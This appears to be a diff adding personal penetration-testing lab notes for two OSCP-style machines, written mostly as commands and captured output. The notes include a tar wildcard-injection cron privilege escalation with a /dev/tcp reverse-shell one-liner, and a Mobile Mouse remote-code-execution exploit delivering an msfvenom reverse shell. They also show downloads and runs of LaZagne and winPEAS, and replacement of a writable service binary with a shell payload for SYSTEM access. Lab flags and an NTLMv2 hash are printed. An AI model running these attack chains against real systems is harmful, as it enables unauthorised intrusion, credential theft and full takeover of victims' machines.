+╔══════════╣ Checking Pkexec policy
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2                                                                                          
+                                                                                                  
+[Configuration]
+AdminIdentities=unix-user:0
+[Configuration]
+AdminIdentities=unix-group:sudo;unix-group:admin
+
+╔══════════╣ Users with console
+cassie:x:1000:1000:CLWEB:/home/cassie:/bin/bash                                                   
+mark:x:1010:1010::/home/robert:/bin/bash
+robert:x:1010:1010::/home/robert:/bin/bash
+root:x:0:0:root:/root:/bin/bash
+
+╔══════════╣ Analyzing SSH Files (limit 70)                                                       
+-rw------- 1 cassie cassie 0 Oct 31  2022 /home/cassie/.ssh/authorized_keys
+-rw-r--r-- 1 root root 600 Oct 31  2022 /etc/ssh/ssh_host_dsa_key.pub
+-rw-r--r-- 1 root root 172 Oct 31  2022 /etc/ssh/ssh_host_ecdsa_key.pub
+-rw-r--r-- 1 root root 92 Oct 31  2022 /etc/ssh/ssh_host_ed25519_key.pub
+-rw-r--r-- 1 root root 564 Oct 31  2022 /etc/ssh/ssh_host_rsa_key.pub
+PermitRootLogin yes
+
+╔══════════╣ Analyzing FTP Files (limit 70)
+-rw-r--r-- 1 root root 5907 Nov  2  2022 /etc/vsftpd.conf                                         
+anonymous_enable=YES
+local_enable=YES
+#write_enable=YES
+#anon_upload_enable=YES
+#anon_mkdir_write_enable=YES
+#chown_uploads=YES
+
+╔══════════╣ SGID
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                  
+-rwxr-sr-x 1 root tty 23K Feb 21  2022 /usr/bin/write.ul (Unknown SGID binary)
+
+╔══════════╣ Cron jobs
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs            
+/bin/crontab                                                                                      
+incrontab Not Found
+-rw-r--r-- 1 root root    1136 Mar 23  2022 /etc/crontab                                          
+/etc/cron.d:
+total 20
+drwxr-xr-x  2 root root 4096 Nov 22  2022 .
+drwxr-xr-x 99 root root 4096 Nov 22  2022 ..
+-rw-r--r--  1 root root  102 Mar 23  2022 .placeholder
+-rw-r--r--  1 root root  115 Nov 22  2022 2minutes
+-rw-r--r--  1 root root  201 Jan  8  2022 e2scrub_all
+
+
+			# SUID BINARIES: 
+# SUID3NUM
+cassie@oscp:/tmp$ wget http://192.168.45.243:80/suid3num.py
+cassie@oscp:/tmp$ chmod +x suid3num.py
+cassie@oscp:/tmp$ python3 suid3num.py
+
+[~] Custom SUID Binaries (Interesting Stuff)                                                                                                                          
+/usr/bin/fusermount3                  
+
+                                                            
+		# Unix Wildcards injection:
+https://www.exploit-db.com/papers/33930
+https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
+https://systemweakness.com/privilege-escalation-using-wildcard-injection-tar-wildcard-injection-a57bc81df61c
+
+# Listing all world writable directories
+cassie@oscp:/opt/admin$ find / -writable -type d 2>/dev/null                                      
+/opt/admin
+
+# Inspecting the cron log file
+cassie@oscp:/tmp$ grep "CRON" /var/log/syslog
+May 12 10:46:01 oscp CRON[35301]: (root) CMD (cd /opt/admin && tar -zxf /tmp/backup.tar.gz *)
+
+# Showing the content and permissions of the /tmp/backup.tar.gz
+cat /tmp/backup.tar.gz
+cat: /tmp/backup.tar.gz: No such file or directory
+ls -lah /tmp/backup.tar.gz
+ls: cannot access '/tmp/backup.tar.gz': No such file or directory
+cat /opt/admin
+ls -lah /opt/admin
+
+# Inserting a reverse shell one-liner in /opt/admin
+# on /opt/admin
+cassie@oscp:/opt/admin$ echo "" > "--checkpoint-action=exec=sh shell.sh"
+cassie@oscp:/opt/admin$ echo "" > --checkpoint=1
+cassie@oscp:/opt/admin$ echo "sh -i >& /dev/tcp/192.168.45.243/9999 0>&1" > shell.sh
+# On /tmp/
+cassie@oscp:/tmp$ mkdir backup.tar.gz                                                             
+
+┌──(kali㉿kali)-[~]
+└─$ nc -nvlp 9999
+listening on [any] 9999 ...
+connect to [192.168.45.243] from (UNKNOWN) [192.168.216.157] 47570
+
+sh-5.1# whoami
+root
+
+sh-5.1# cat proof.txt
+ddaecb2f354c68e75c8a552772e49c69
+
+
+--------------------------------------------------------------------------------------------------
+			192.168.216.155 - Pascha OS ✅
+HTTP: 80 
+pando-pub: 7680
+???: 9099
+abyss: 9999
+???: 35913
+
+				NMAP: TCP
+┌──(kali㉿kali)-[~]
+└─$ nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 192.168.216.155
+
+HTTP: 80 
+80/tcp    open  http       syn-ack Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows
+| http-methods: 
+|_  Supported Methods: GET HEAD OPTIONS
+
+pando-pub: 7680
+7680/tcp  open  pando-pub? syn-ack
+
+???: 9099
+9099/tcp  open  unknown    syn-ack
+| fingerprint-strings: 
+|   FourOhFourRequest, GetRequest, OfficeScan, apple-iphoto: 
+|     HTTP/1.0 200 OK 
+|     Server: Mobile Mouse Server 
+|     Content-Type: text/html 
+|     Content-Length: 321
+|_    <HTML><HEAD><TITLE>Success!</TITLE><meta name="viewport" content="width=device-width,user-scalable=no" /></HEAD><BODY BGCOLOR=#000000><br><br><p style="font:12pt arial,geneva,sans-serif; text-align:center; color:green; font-weight:bold;" >The server running on "OSCP" was able to receive your request.</p></BODY></HTML>
+
+abyss: 9999
+9999/tcp  open  abyss?     syn-ack
+
+???: 35913
+35913/tcp open  unknown    syn-ack
+
+				NMAP: UDP
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap -sU -O 192.168.216.155
+All 1000 scanned ports on 192.168.216.155 are in ignored states.
+
+
+				HTTP: 80
+http://192.168.216.155/
+Web servers
+- IIS 10.0
+Operating systems
+- Windows Server
+
+				pando-pub: 7680
+EXPLOITS: 
+searchsploit pandopub 
+Exploits: No Results
+Shellcodes: No Results
+GOOGLE: 
+Panda Security (Multiple Products) - Local Privilege Escalation
+https://www.exploit-db.com/exploits/40020
+
+				abyss: 9999
+
+				???: 35913
+
+			Mobile Mouse Server: 9099
+EXPLOITS: 
+Server: Mobile Mouse Server
+searchsploit Mobile Mouse       
+Mobile Mouse 3.6.0.4 - Remote Code Execution (RCE)             | windows/remote/51010.py
+https://www.exploit-db.com/exploits/51010
+GOOGLE: 
+Mobile Mouse 3.6.0.4 Remote Code Execution Exploit
+https://github.com/blue0x1/mobilemouse-exploit
+
+				# CVE-2023-31902
+https://github.com/blue0x1/mobilemouse-exploit/blob/main/CVE-2023-31902.py
+
+┌──(kali㉿kali)-[~/Desktop/C/155]
+└─$ chmod +x CVE-2023-31902.py 
+                                 
+┌──(kali㉿kali)-[~/Desktop/C/155]
+└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.243 LPORT=80 -f exe > shell.exe
+
+┌──(kali㉿kali)-[~/Desktop/C/155]
+└─$ python3 -m http.server 8080  
+
+┌──(kali㉿kali)-[~/Desktop/C/155]
+└─$ python3 CVE-2023-31902.py --target 192.168.216.155 --lhost 192.168.45.243 --file shell.exe
+
+┌──(kali㉿kali)-[~]
+└─$ sudo nc -nvlp 80 
+
+restarted reverted lab, and this is working now
+
+				ACCESS: local.txt
+┌──(kali㉿kali)-[~]
+└─$ sudo nc -nvlp 80 
+listening on [any] 80 ...
+connect to [192.168.45.243] from (UNKNOWN) [192.168.216.155] 57837
+Microsoft Windows [Version 10.0.19045.2251]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\Temp>whoami
+oscp\tim
+
+C:\Windows\Temp>hostname
+oscp
+
+C:\Windows\Temp> powershell -ep bypass
+
+PS C:\Users\Tim\Desktop> cat local.txt
+b42740ec0257b01b6a6659391387a556
+
+
+				PRIV ESC: proof.txt
+
+PS C:\Users\Tim\Desktop> whoami /priv
+whoami /priv
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                          State   
+============================= ==================================== ========
+SeShutdownPrivilege           Shut down the system                 Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
+SeUndockPrivilege             Remove computer from docking station Disabled
+SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
+SeTimeZonePrivilege           Change the time zone                 Disabled
+
+PS C:\Users\Tim\Desktop> systeminfo
+Host Name:                 OSCP
+OS Name:                   Microsoft Windows 10 Pro
+OS Version:                10.0.19045 N/A Build 19045
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Workstation
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Offsec
+Registered Organization:   
+Product ID:                00331-10000-00001-AA218
+Original Install Date:     11/3/2022, 11:43:18 AM
+System Boot Time:          3/29/2024, 1:03:28 PM
+System Manufacturer:       VMware, Inc.
+System Model:              VMware7,1
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) In
+
+
+				NETWORK:
+PS C:\Users\Tim\Desktop> ipconfig /all
+Windows IP Configuration
+   Host Name . . . . . . . . . . . . : oscp
+   Primary Dns Suffix  . . . . . . . : 
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+Ethernet adapter Ethernet0:
+   Connection-specific DNS Suffix  . : 
+   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
+   Physical Address. . . . . . . . . : 00-50-56-AB-C3-AA
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+   Link-local IPv6 Address . . . . . : fe80::135:1b13:4f3d:50d5%4(Preferred) 
+   IPv4 Address. . . . . . . . . . . : 192.168.216.155(Preferred) 
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.216.254
+   DHCPv6 IAID . . . . . . . . . . . : 335564886
+   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2D-98-D6-F1-00-50-56-AB-7B-47
+   DNS Servers . . . . . . . . . . . : 192.168.216.254
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+
+PS C:\Users\Tim\Desktop> route print
+route print
+===========================================================================
+Interface List
+  4...00 50 56 ab c3 aa ......vmxnet3 Ethernet Adapter
+  1...........................Software Loopback Interface 1
+===========================================================================
+IPv4 Route Table
+===========================================================================
+Active Routes:
+Network Destination        Netmask          Gateway       Interface  Metric
+          0.0.0.0          0.0.0.0  192.168.216.254  192.168.216.155     16
+        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
+        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
+  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
+    192.168.216.0    255.255.255.0         On-link   192.168.216.155    271
+  192.168.216.155  255.255.255.255         On-link   192.168.216.155    271
+  192.168.216.255  255.255.255.255         On-link   192.168.216.155    271
+        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
+        224.0.0.0        240.0.0.0         On-link   192.168.216.155    271
+  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
+  255.255.255.255  255.255.255.255         On-link   192.168.216.155    271
+===========================================================================
+Persistent Routes:
+  Network Address          Netmask  Gateway Address  Metric
+          0.0.0.0          0.0.0.0  192.168.216.254       1
+===========================================================================
+IPv6 Route Table
+===========================================================================
+Active Routes:
+ If Metric Network Destination      Gateway
+  1    331 ::1/128                  On-link
+  4    271 fe80::/64                On-link
+  4    271 fe80::135:1b13:4f3d:50d5/128
+                                    On-link
+  1    331 ff00::/8                 On-link
+  4    271 ff00::/8                 On-link
+===========================================================================
+Persistent Routes:
+  None
+
+PS C:\Users\Tim\Desktop> arp -A
+Interface: 192.168.216.155 --- 0x4
+  Internet Address      Physical Address      Type
+  192.168.216.254       00-50-56-ab-c6-03     dynamic   
+  192.168.216.255       ff-ff-ff-ff-ff-ff     static    
+  224.0.0.22            01-00-5e-00-00-16     static    
+  224.0.0.251           01-00-5e-00-00-fb     static    
+  224.0.0.252           01-00-5e-00-00-fc     static   
+
+				CREDS: NOTHING
+#Powershell password hunting:
+PS C:\> (Get-PSReadlineOption).HistorySavePath
+PS C:\Users\Tim\Desktop> type C:\Users\Tim\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+type : Cannot find path 'C:\Users\Tim\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt' 
+because it does not exist.
+
+# LaZagne: 
+iwr -uri http://192.168.45.243:80/LaZagne.exe -Outfile laz.exe
+.\laz.exe all
+[+] 0 passwords have been found.
+
+
+				INTERESTING FILES: NOTHING
+Get-ChildItem -Path C:\ -Include proof.txt -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\ -Include *.git -File -Recurse -ErrorAction SilentlyContinue -Force
+
+
+				WINPEAS: 
+iwr -uri http://192.168.45.243:80/winPEASx64.exe -Outfile winpea.exe
+.\winpea.exe
+
+          ͹ AV Information
+    Some AV was detected, search for bypasses
+    Name: Windows Defender
+    ProductEXE: windowsdefender://
+    pathToSignedReportingExe: %ProgramFiles%\Windows Defender\MsMpeng.exe
+
+          ͹ RDP Sessions
+    SessID    pSessionName   pUserName      pDomainName              State     SourceIP
+    1         Console        Tim            OSCP                     Active    
+
+          ͹ Interesting Services -non Microsoft-
+    GPGOrchestrator(Genomedics srl - GPG Orchestrator)["C:\Program Files\MilleGPG5\GPGService.exe"] - Auto - Running
+    YOU CAN MODIFY THIS SERVICE: AllAccess
+    File Permissions: Users [WriteData/CreateFiles]
+    Possible DLL Hijacking in binary folder: C:\Program Files\MilleGPG5 (Users [WriteData/CreateFiles])   
+
+          ͹ Modifiable Services
+  Check if you can modify any service https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services                                                                       
+    LOOKS LIKE YOU CAN MODIFY OR START/STOP SOME SERVICE/s:
+    GPGOrchestrator: AllAccess
+
+          ͹ Enumerating Security Packages Credentials
+  Version: NetNTLMv2
+  Hash:    Tim::OSCP:1122334455667788:4a0c69aeab88efb20f2083807c128462:01010000000000004bd8c63d35a4da018880f68b5a00fc7f0000000008003000300000000000000000000000002000004c8456c27d0f36ccb3d66f11e689306e3514724680308938f2ce04f71887b5c60a00100000000000000000000000000000000000090000000000000000000000  
+
+
+				# BINARY HIJACKING: 
+          ͹ Interesting Services -non Microsoft-
+    GPGOrchestrator(Genomedics srl - GPG Orchestrator)["C:\Program Files\MilleGPG5\GPGService.exe"] - Auto - Running
+    YOU CAN MODIFY THIS SERVICE: AllAccess
+    File Permissions: Users [WriteData/CreateFiles]
+    Possible DLL Hijacking in binary folder: C:\Program Files\MilleGPG5 (Users [WriteData/CreateFiles])   
+
+          ͹ Modifiable Services
+  Check if you can modify any service https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services                                                                       
+    LOOKS LIKE YOU CAN MODIFY OR START/STOP SOME SERVICE/s:
+    GPGOrchestrator: AllAccess
+
+PS C:\Users\Tim\Downloads> cd 'C:\Program Files\MilleGPG5'
+-a----         3/24/2021   3:33 AM       11227552 GPGService.exe                                                       
+
+# List of services with binary path
+PS C:\Program Files\MilleGPG5> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+GPGOrchestrator        Running "C:\Program Files\MilleGPG5\GPGService.exe"                                      
+
+PS C:\Program Files\MilleGPG5> icacls 'C:\Program Files\MilleGPG5\GPGService.exe'
+C:\Program Files\MilleGPG5\GPGService.exe BUILTIN\Users:(R)
+                                          BUILTIN\Users:(I)(M)
+                                          NT AUTHORITY\SYSTEM:(I)(F)
+                                          BUILTIN\Administrators:(I)(F)
+                                          APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
+                                          APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
+
+			# REPLACE WITH REVERSE SHELL: 
+┌──(kali㉿kali)-[~/Desktop/C/155]
+└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.243 LPORT=443 -f exe > GPGService.exe
+
+┌──(kali㉿kali)-[~/Desktop/C/155]
+└─$ python3 -m http.server 80
+
+┌──(kali㉿kali)-[~]
+└─$ nc -nvlp 443  
+
+# Replacing GPGService.exe with our malicious binary
+PS C:\Users\tim\Documents> iwr -uri http://192.168.45.243:80/GPGService.exe -Outfile GPGService.exe
+PS C:\Users\tim> cd Downloads
+PS C:\Users\tim\Downloads> move 'C:\Program Files\MilleGPG5\GPGService.exe' GPGService.exe
+PS C:\Users\tim> cd Documents
+PS C:\Users\tim\Documents> move .\GPGService.exe 'C:\Program Files\MilleGPG5\GPGService.exe'
+
+# Attempting to stop the service in order to restart it
+PS C:\Users\tim\Documents> net stop GPGOrchestrator
+The GPG Orchestrator service was stopped successfully.
+PS C:\Users\tim\Documents> net start GPGOrchestrator
+
+┌──(kali㉿kali)-[~]
+└─$ nc -nvlp 443                                                                         
+listening on [any] 443 ...
+connect to [192.168.45.243] from (UNKNOWN) [192.168.216.155] 58647
+Microsoft Windows [Version 10.0.19045.2251]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+
+C:\Users\Administrator\Desktop>type proof.txt
+type proof.txt
+65e02bd9444fae12b9f0739ff90fb13f
+
+--------------------------------------------------------------------------------------------------
+
